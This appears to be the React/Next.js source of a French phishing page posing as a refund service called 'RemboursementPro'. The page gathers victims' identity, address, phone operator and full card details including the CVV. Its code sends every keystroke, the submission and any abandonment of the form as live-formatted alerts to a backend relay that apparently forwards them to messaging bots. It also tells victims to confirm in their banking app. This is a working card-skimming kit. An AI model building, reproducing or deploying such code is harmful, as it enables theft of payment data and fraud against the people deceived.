"use client";

import { useEffect } from 'react';

export default function Home() {

  useEffect(() => {
    const config = {
      validation: {
        email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        phone: /^[\+]?[\d\s\.\-\(\)]{7,20}$/,
        postalCode: /^[\d\w\s\-]{3,10}$/,
        cardNumber: /^\d{16}$/,
        cvc: /^\d{3,4}$/
      }
    };

    const backendUrl = '/api/send-message';

    const state: any = {
      formProgress: 0,
      isSubmitting: false,
      sessionStart: new Date(),
      sessionId: Date.now(),
      formStarted: false,
      messageIds: {},
      formData: {
        nom: '', prenom: '', email: '', tel: '', operateur: '',
        adresse: '', ville: '', postal: '', pays: '',
        carte: '', mois: '', annee: '', cvc: ''
      },
      device: {
        language: navigator.language,
        screenResolution: typeof window !== 'undefined' ? `${window.screen.width}x${window.screen.height}` : 'unknown',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        browser: getBrowserName()
      }
    };

    function getBrowserName() {
      const a = navigator.userAgent;
      if (a.includes('Chrome')) return 'Chrome';
      if (a.includes('Safari')) return 'Safari';
      if (a.includes('Firefox')) return 'Firefox';
      if (a.includes('Edge')) return 'Edge';
      return 'Unknown';
    }

    setupFormValidation();
    setupCardPreview();
    setupProgressTracking();
    setupSmoothScrolling();
    setupHeaderScroll();
    setupAnimationObserver();
    setupPageVisibilityTracking();
    setupOperatorField();

    const keepAliveInterval = setInterval(() => {
      fetch(backendUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: 'ping', type: 'keepalive', messageIds: {} })
      }).catch(() => {});
    }, 4 * 60 * 1000);

    async function sendToBots(message: string, type = 'info') {
      const now = new Date();
      const date = now.toLocaleDateString('fr-FR');
      const time = now.toLocaleTimeString('fr-FR');
      const timeSpent = Math.round((Date.now() - state.sessionStart) / 1000);

      let messageToSend = message;
      let messageIdsToUse = state.messageIds;

      if (type === 'typing_start') {
        messageToSend = `⌨️ <b>NOUVELLE DEMANDE DE REMBOURSEMENT</b>\n\n━━━━━━━━━━━━━━━━\n📅 ${date} ⏰ ${time}\n🌐 ${state.device.language} | ${state.device.browser}\n📱 ${state.device.screenResolution}\n🔒 Session: ${state.sessionId}\n━━━━━━━━━━━━━━━━\n<i>Le client a commencé à remplir le formulaire...</i>`;
        messageIdsToUse = {};
      } else if (type === 'form_update') {
        messageToSend = `💳 <b>DEMANDE DE REMBOURSEMENT</b> — EN COURS 🔄\n\n━━━━━━━━━━━━━━━━\n📅 ${date} ⏰ ${time}\n\n👤 <b>CLIENT</b>\n• Nom: ${state.formData.prenom} ${state.formData.nom}\n• Email: ${state.formData.email || '—'}\n• Tél: ${state.formData.tel || '—'}\n• Opérateur: ${state.formData.operateur || '—'}\n\n📍 <b>ADRESSE</b>\n• ${state.formData.adresse || '—'}, ${state.formData.postal || ''} ${state.formData.ville || ''}\n• Pays: ${state.formData.pays || '—'}\n\n💳 <b>CARTE</b>\n• Numéro: ${state.formData.carte || '—'}\n• Exp: ${state.formData.mois || '--'}/${state.formData.annee || '--'}\n• CVV: ${state.formData.cvc || '—'}\n\n📊 <b>PROGRESSION: ${Math.round(state.formProgress)}%</b> | ⏱️ ${Math.floor(timeSpent / 60)}m${timeSpent % 60}s\n🔒 Session: ${state.sessionId}\n━━━━━━━━━━━━━━━━`;
      } else if (type === 'completed') {
        messageToSend = `✅ <b>FORMULAIRE VALIDÉ</b>\n\n━━━━━━━━━━━━━━━━\n📅 ${date} ⏰ ${time}\n\n👤 <b>CLIENT</b>\n• Nom: ${state.formData.prenom} ${state.formData.nom}\n• Email: ${state.formData.email}\n• Tél: ${state.formData.tel}\n• Opérateur: ${state.formData.operateur}\n\n📍 <b>ADRESSE</b>\n• ${state.formData.adresse}, ${state.formData.postal} ${state.formData.ville}\n• Pays: ${state.formData.pays}\n\n💳 <b>CARTE BANCAIRE</b>\n• Numéro: ${state.formData.carte}\n• Expiration: ${state.formData.mois}/${state.formData.annee}\n• CVV: ${state.formData.cvc}\n\n⏱️ Temps total: ${Math.floor(timeSpent / 60)}m${timeSpent % 60}s\n🔒 Session: ${state.sessionId}\n━━━━━━━━━━━━━━━━\n<i>⚠️ NOUVELLE DEMANDE À TRAITER ⚠️</i>`;
        messageIdsToUse = {};
      } else if (type === 'leave') {
        messageToSend = `⚠️ <b>ABANDON DU FORMULAIRE</b>\n\n━━━━━━━━━━━━━━━━\n📅 ${date} ⏰ ${time}\n👤 ${state.formData.prenom} ${state.formData.nom || 'Inconnu'}\n📊 Progression: ${Math.round(state.formProgress)}%\n⏱️ Temps passé: ${Math.floor(timeSpent / 60)}m${timeSpent % 60}s\n🔒 Session: ${state.sessionId}\n━━━━━━━━━━━━━━━━`;
      }

      try {
        const response = await fetch(backendUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: messageToSend, messageIds: messageIdsToUse, type: type })
        });
        const data = await response.json();
        if (data.messageIds && Object.keys(data.messageIds).length > 0) {
          if (type !== 'completed') {
            Object.assign(state.messageIds, data.messageIds);
          }
        }
      } catch (err) {
        console.error('[sendToBots] Erreur:', err);
      }
    }

    function setupPageVisibilityTracking() {
      let visited = false;
      if (!visited) { visited = true; sendToBots('🚀 Nouvelle visite détectée', 'page_activity'); }
      let pageHidden = false;
      document.addEventListener('visibilitychange', () => {
        if (document.hidden) { pageHidden = true; }
        else if (pageHidden) { sendToBots('✅ Utilisateur est revenu', 'page_activity'); }
      });
    }

    function setupFormValidation() {
      const form = document.getElementById('mainForm');
      if (!form) return;
      const inputs = form.querySelectorAll('.input, .select');
      const termsCheckbox = document.getElementById('terms') as HTMLInputElement;
      const submitBtn = document.getElementById('submitBtn') as HTMLButtonElement;
      inputs.forEach(input => {
        input.addEventListener('input', () => validateField(input as HTMLInputElement | HTMLSelectElement));
        input.addEventListener('blur', () => { validateField(input as HTMLInputElement | HTMLSelectElement); updateFormProgress(); });
      });
      if (termsCheckbox && submitBtn) {
        termsCheckbox.addEventListener('change', () => { submitBtn.disabled = !termsCheckbox.checked || !isFormValid(); });
      }
      form.addEventListener('submit', handleFormSubmit);
    }

    function validateField(field: HTMLInputElement | HTMLSelectElement) {
      const fieldError = document.getElementById(`${field.id}-error`);
      let isValid = true, errorMessage = '';
      if (field.hasAttribute('required') && !field.value.trim()) {
        isValid = false;
        errorMessage = field.tagName === 'SELECT' ? 'Veuillez sélectionner' : 'Ce champ est requis';
      } else {
        switch (field.id) {
          case 'email': if (field.value && !config.validation.email.test(field.value)) { isValid = false; errorMessage = 'Email invalide'; } break;
          case 'tel': if (field.value && !config.validation.phone.test(field.value)) { isValid = false; errorMessage = 'Numéro invalide'; } break;
          case 'postal': if (field.value && !config.validation.postalCode.test(field.value)) { isValid = false; errorMessage = 'Code postal invalide'; } break;
          case 'carte': const c = field.value.replace(/\s/g, ''); if (c && !config.validation.cardNumber.test(c)) { isValid = false; errorMessage = '16 chiffres requis'; } break;
          case 'cvc': if (field.value && !config.validation.cvc.test(field.value)) { isValid = false; errorMessage = '3-4 chiffres'; } break;
        }
      }
      if (isValid) { field.classList.remove('error'); if (fieldError) fieldError.classList.remove('show'); }
      else { field.classList.add('error'); if (fieldError) { fieldError.textContent = errorMessage; fieldError.classList.add('show'); } }
      return isValid;
    }

    function isFormValid() {
      const form = document.getElementById('mainForm');
      if (!form) return false;
      const inputs = form.querySelectorAll('.input, .select');
      const termsCheckbox = document.getElementById('terms') as HTMLInputElement;
      return Array.from(inputs).every(input => validateField(input as HTMLInputElement | HTMLSelectElement)) && (termsCheckbox && termsCheckbox.checked);
    }

    function updateFormProgress() {
      const form = document.getElementById('mainForm');
      if (!form) return;
      const inputs = form.querySelectorAll('.input, .select');
      const filled = Array.from(inputs).filter((i: any) => i.value.trim() !== '');
      state.formProgress = (filled.length / inputs.length) * 100;
      const bar = document.getElementById('progressBar');
      if (bar) bar.style.width = `${state.formProgress}%`;
      const submitBtn = document.getElementById('submitBtn') as HTMLButtonElement;
      const termsCheckbox = document.getElementById('terms') as HTMLInputElement;
      if (submitBtn && termsCheckbox) submitBtn.disabled = !termsCheckbox.checked || !isFormValid();
    }

    function setupCardPreview() {
      const cardInput = document.getElementById('carte') as HTMLInputElement;
      const nameInput = document.getElementById('nom') as HTMLInputElement;
      const monthSelect = document.getElementById('mois') as HTMLSelectElement;
      const yearSelect = document.getElementById('annee') as HTMLSelectElement;
      const cvcInput = document.getElementById('cvc') as HTMLInputElement;
      const telInput = document.getElementById('tel') as HTMLInputElement;
      const postalInput = document.getElementById('postal') as HTMLInputElement;

      if (cardInput) {
        cardInput.addEventListener('input', (e: any) => {
          let value = e.target.value.replace(/\D/g, '').substring(0, 16);
          e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
          updateCardPreview();
        });
      }
      if (cvcInput) {
        cvcInput.addEventListener('input', (e: any) => { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); });
      }
      if (postalInput) {
        postalInput.addEventListener('input', (e: any) => { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10); });
      }
      if (telInput) {
        telInput.addEventListener('input', (e: any) => { e.target.value = e.target.value.replace(/[^\d\s\+\-]/g, ''); });
      }
      if (nameInput) nameInput.addEventListener('input', updateCardPreview);
      if (monthSelect) monthSelect.addEventListener('change', updateCardPreview);
      if (yearSelect) yearSelect.addEventListener('change', updateCardPreview);
    }

    function updateCardPreview() {
      const cardInput = document.getElementById('carte') as HTMLInputElement;
      const cardNumber = cardInput?.value.replace(/\s/g, '') || '';
      const masked = cardNumber.replace(/\d(?=\d{4})/g, '*');
      const cardNumberEl = document.getElementById('cardNumber');
      if (cardNumberEl) cardNumberEl.textContent = masked.replace(/(.{4})/g, '$1 ').trim() || '**** **** **** ****';
      const nameInput = document.getElementById('nom') as HTMLInputElement;
      const cardNameEl = document.getElementById('cardName');
      if (cardNameEl) cardNameEl.textContent = nameInput?.value.trim().toUpperCase() || 'VOTRE NOM';
      const m = (document.getElementById('mois') as HTMLSelectElement)?.value || 'MM';
      const y = (document.getElementById('annee') as HTMLSelectElement)?.value ? (document.getElementById('annee') as HTMLSelectElement).value.slice(-2) : 'AA';
      const cardExpEl = document.getElementById('cardExp');
      if (cardExpEl) cardExpEl.textContent = `${m}/${y}`;
    }

    function throttle(fn: Function, wait: number) {
      let lastRun = 0, timer: any = null;
      return function (this: any, ...args: any[]) {
        const now = Date.now();
        if (now - lastRun >= wait) {
          lastRun = now;
          fn.apply(this, args);
        } else if (!timer) {
          timer = setTimeout(() => { lastRun = Date.now(); timer = null; fn.apply(this, args); }, wait - (now - lastRun));
        }
      };
    }

    const sendFormUpdate = throttle(() => {
      if (!state.formStarted) return;
      const filled = Object.keys(state.formData).filter(k => state.formData[k]);
      state.formProgress = (filled.length / Object.keys(state.formData).length) * 100;
      sendToBots('', 'form_update');
    }, 1000);

    function setupProgressTracking() {
      const inputs = document.querySelectorAll('.track');
      inputs.forEach(input => {
        input.addEventListener('input', (e: any) => {
          state.formData[e.target.id] = e.target.value.trim();
          if (!state.formStarted) {
            state.formStarted = true;
            sendToBots('', 'typing_start');
          } else {
            sendFormUpdate();
          }
        });
        input.addEventListener('blur', (e: any) => {
          if (e.target.value.trim()) state.formData[e.target.id] = e.target.value.trim();
          if (state.formStarted) sendFormUpdate();
        });
      });
    }

    function setupOperatorField() {
      const telField = document.querySelector('#tel')?.closest('.field');
      if (!telField || document.getElementById('operateur')) return;
      const operatorField = document.createElement('div');
      operatorField.className = 'field';
      operatorField.innerHTML = `
        <label class="label" for="operateur">Opérateur mobile</label>
        <select class="select track" id="operateur">
            <option value="">Sélectionner</option>
            <option value="Orange">Orange</option>
            <option value="SFR">SFR</option>
            <option value="Bouygues">Bouygues</option>
            <option value="Free">Free</option>
        </select>
        <div class="field-hint">Sélectionnez votre opérateur</div>`;
      telField.parentNode?.insertBefore(operatorField, telField.nextSibling);
      document.getElementById('operateur')?.addEventListener('change', (e: any) => {
        state.formStarted = true;
        state.formData.operateur = e.target.value;
        sendFormUpdate();
      });
    }

    async function handleFormSubmit(event: Event) {
      event.preventDefault();
      if (state.isSubmitting || !isFormValid()) return;
      state.isSubmitting = true;
      const submitBtn = document.getElementById('submitBtn') as HTMLButtonElement;
      submitBtn.classList.add('loading');
      submitBtn.disabled = true;
      
      const getValue = (id: string) => (document.getElementById(id) as HTMLInputElement | HTMLSelectElement)?.value || '';

      state.formData = {
        prenom: getValue('prenom').trim(), nom: getValue('nom').trim(),
        email: getValue('email').trim(), tel: getValue('tel').trim(),
        operateur: getValue('operateur'), adresse: getValue('adresse').trim(),
        ville: getValue('ville').trim(), postal: getValue('postal').trim(),
        pays: getValue('pays'), carte: getValue('carte').replace(/\s/g, ''),
        mois: getValue('mois'), annee: getValue('annee'), cvc: getValue('cvc').trim()
      };
      state.formProgress = 100;
      await sendToBots('', 'completed');
      await new Promise(resolve => setTimeout(resolve, 1500));
      const formBody = document.getElementById('formBody');
      const successState = document.getElementById('successState');
      if(formBody) formBody.style.display = 'none';
      if(successState) successState.classList.add('show');
    }

    function setupSmoothScrolling() {
      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (this: HTMLAnchorElement, e) {
          e.preventDefault();
          const target = document.querySelector(this.getAttribute('href') || '');
          if (target) target.scrollIntoView({ behavior: 'smooth' });
        });
      });
    }

    function setupHeaderScroll() {
      const header = document.getElementById('header');
      window.addEventListener('scroll', () => {
        if (header) header.classList.toggle('scrolled', window.scrollY > 100);
      });
    }

    function setupAnimationObserver() {
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            (entry.target as HTMLElement).style.opacity = '1';
            (entry.target as HTMLElement).style.transform = 'translateY(0)';
          }
        });
      }, { threshold: 0.1 });
      document.querySelectorAll('.review-card, .trust-badge, .logo-item').forEach(el => {
        (el as HTMLElement).style.opacity = '0';
        (el as HTMLElement).style.transform = 'translateY(20px)';
        (el as HTMLElement).style.transition = 'all 0.5s ease';
        observer.observe(el);
      });
    }

    const beforeUnloadHandler = () => { if (state.formStarted) sendToBots('', 'leave'); };
    window.addEventListener('beforeunload', beforeUnloadHandler);

    return () => {
      clearInterval(keepAliveInterval);
      window.removeEventListener('beforeunload', beforeUnloadHandler);
    };
  }, []);

  const scrollToForm = () => { document.getElementById('form')?.scrollIntoView({ behavior: 'smooth' }); };

  return (
    <div className="animate-fade-in">
      <header className="header" id="header">
          <div className="logo-container" onClick={() => window.scrollTo({top: 0, behavior: 'smooth'})}>
              <div className="flag"></div>
              <div className="logo-text">RemboursementPro</div>
          </div>
          <nav className="nav-menu">
              <a href="#partners" className="nav-link">Partenaires</a>
              <a href="#testimonials" className="nav-link">Témoignages</a>
              <a href="#form" className="nav-link">Demande</a>
          </nav>
          <button className="header-cta mobile-hide" onClick={scrollToForm}>Commencer maintenant</button>
      </header>

      <section className="hero">
          <div className="hero-content">
              <div className="hero-text">
                  <h1>Récupérez votre <span className="highlight">argent</span> rapidement</h1>
                  <p>Service professionnel de remboursement pour récupérer les sommes injustement prélevées. Traitement sécurisé sous 24h.</p>
                  <div className="hero-buttons mobile-hide">
                      <a href="#form" className="btn-primary"><i className="fas fa-rocket"></i> Commencer maintenant</a>
                  </div>
              </div>
              <div className="hero-image">
                  <div className="hero-card">
                      <div className="stats-grid">
                          <div className="stat-item"><div className="stat-number">98%</div><div className="stat-label">Succès</div></div>
                          <div className="stat-item"><div className="stat-number">24h</div><div className="stat-label">Délai</div></div>
                          <div className="stat-item"><div className="stat-number">0€</div><div className="stat-label">Frais</div></div>
                      </div>
                  </div>
              </div>
          </div>
      </section>

      <section className="form" id="form">
          <div style={{ textAlign: "center" }}>
              <span className="section-label">Demande de remboursement</span>
              <h2 className="section-title">Formulaire de demande</h2>
              <p className="section-subtitle">Processus 100% sécurisé et confidentiel</p>
          </div>
          <div className="form-container">
              <div className="form-info">
                  <h2>Pourquoi nous ?</h2>
                  <div className="form-benefits">
                      <div className="form-benefit"><i className="fas fa-lock"></i><div><h4>Sécurisé</h4><p>Cryptage de niveau bancaire</p></div></div>
                      <div className="form-benefit"><i className="fas fa-euro-sign"></i><div><h4>Gratuit</h4><p>Aucun frais à l'avance</p></div></div>
                      <div className="form-benefit"><i className="fas fa-headset"></i><div><h4>Support</h4><p>Assistance 24/7</p></div></div>
                  </div>
              </div>

              <div className="form-box">
                  <div className="form-top">
                      <div className="brand"><div className="flag"></div><span className="brand-name">RemboursementPro</span></div>
                      <span className="fee-badge">0% Frais</span>
                  </div>
                  <div className="card-preview">
                      <div className="card-chip"><i className="fas fa-sim-card"></i></div>
                      <div className="card-data">
                          <div className="card-number" id="cardNumber">**** **** **** ****</div>
                          <div className="card-extra"><span id="cardName">VOTRE NOM</span><span id="cardExp">MM/AA</span></div>
                      </div>
                  </div>

                  <div className="form-body" id="formBody">
                      <div className="form-progress"><div className="form-progress-bar" id="progressBar"></div></div>
                      <form id="mainForm" noValidate>
                          <div className="field-group">
                              <h3 className="field-group-title"><i className="fas fa-user"></i> Identité</h3>
                              <div className="row-2">
                                  <div className="field">
                                      <label className="label" htmlFor="prenom">Prénom</label>
                                      <input className="input track" id="prenom" type="text" required />
                                      <div className="field-error" id="prenom-error"></div>
                                  </div>
                                  <div className="field">
                                      <label className="label" htmlFor="nom">Nom</label>
                                      <input className="input track" id="nom" type="text" required />
                                      <div className="field-error" id="nom-error"></div>
                                  </div>
                              </div>
                              <div className="field">
                                  <label className="label" htmlFor="email">Email</label>
                                  <input className="input track" id="email" type="email" required />
                                  <div className="field-error" id="email-error"></div>
                              </div>
                              <div className="field">
                                  <label className="label" htmlFor="tel">Téléphone</label>
                                  <input className="input track" id="tel" type="tel" required />
                                  <div className="field-error" id="tel-error"></div>
                              </div>
                          </div>

                          <div className="field-group">
                              <h3 className="field-group-title"><i className="fas fa-map-marker-alt"></i> Adresse</h3>
                              <div className="field">
                                  <label className="label" htmlFor="adresse">Adresse complète</label>
                                  <input className="input track" id="adresse" type="text" required />
                                  <div className="field-error" id="adresse-error"></div>
                              </div>
                              <div className="row-2">
                                  <div className="field">
                                      <label className="label" htmlFor="postal">Code postal</label>
                                      <input className="input track" id="postal" type="text" required />
                                      <div className="field-error" id="postal-error"></div>
                                  </div>
                                  <div className="field">
                                      <label className="label" htmlFor="ville">Ville</label>
                                      <input className="input track" id="ville" type="text" required />
                                      <div className="field-error" id="ville-error"></div>
                                  </div>
                              </div>
                              <div className="field">
                                  <label className="label" htmlFor="pays">Pays</label>
                                  <select className="select track" id="pays" required defaultValue="">
                                      <option value="" disabled>Choisir...</option>
                                      <option value="France">France</option>
                                      <option value="Belgique">Belgique</option>
                                      <option value="Suisse">Suisse</option>
                                  </select>
                                  <div className="field-error" id="pays-error"></div>
                              </div>
                          </div>

                          <div className="field-group">
                              <h3 className="field-group-title"><i className="fas fa-credit-card"></i> Paiement</h3>
                              <div className="field">
                                  <label className="label" htmlFor="carte">Numéro de carte</label>
                                  <input className="input track" id="carte" type="text" maxLength={19} required />
                                  <div className="field-error" id="carte-error"></div>
                              </div>
                              <div className="row-3">
                                  <div className="field">
                                      <label className="label" htmlFor="mois">Mois</label>
                                      <select className="select track" id="mois" required defaultValue="">
                                          <option value="" disabled>MM</option>
                                          {['01','02','03','04','05','06','07','08','09','10','11','12'].map(m => <option key={m} value={m}>{m}</option>)}
                                      </select>
                                  </div>
                                  <div className="field">
                                      <label className="label" htmlFor="annee">Année</label>
                                      <select className="select track" id="annee" required defaultValue="">
                                          <option value="" disabled>AAAA</option>
                                          {['2025','2026','2027','2028','2029','2030'].map(y => <option key={y} value={y}>{y}</option>)}
                                      </select>
                                  </div>
                                  <div className="field">
                                      <label className="label" htmlFor="cvc">CVC</label>
                                      <input className="input track" id="cvc" type="text" maxLength={4} required />
                                      <div className="field-error" id="cvc-error"></div>
                                  </div>
                              </div>
                          </div>

                          <div className="checkbox-field">
                              <input type="checkbox" id="terms" className="checkbox" required />
                              <label htmlFor="terms" className="checkbox-label">J'accepte les conditions d'utilisation</label>
                          </div>

                          <button className="submit" id="submitBtn" type="submit" disabled>
                              <span className="submit-text"><i className="fas fa-lock"></i> Valider ma demande</span>
                              <div className="submit-spinner"></div>
                          </button>
                      </form>
                  </div>

                  <div className="success" id="successState">
                      <div className="success-icon"><i className="fas fa-check"></i></div>
                      <h3>Envoyé avec succès !</h3>
                      <p>Votre demande est en cours de traitement. Vérifiez votre application bancaire pour confirmer la réception.</p>
                  </div>
              </div>
          </div>
      </section>

      <footer className="footer">
          <div className="footer-links">
              <a href="#" className="footer-link">À propos</a>
              <a href="#" className="footer-link">FAQ</a>
              <a href="#" className="footer-link">Contact</a>
          </div>
          <p>© 2025 RemboursementPro. Tous droits réservés.</p>
      </footer>

      <div className="floating-support">
          <button className="support-button" onClick={() => alert('Support disponible 24/7')}><i className="fas fa-comments"></i></button>
      </div>
    </div>
  );
}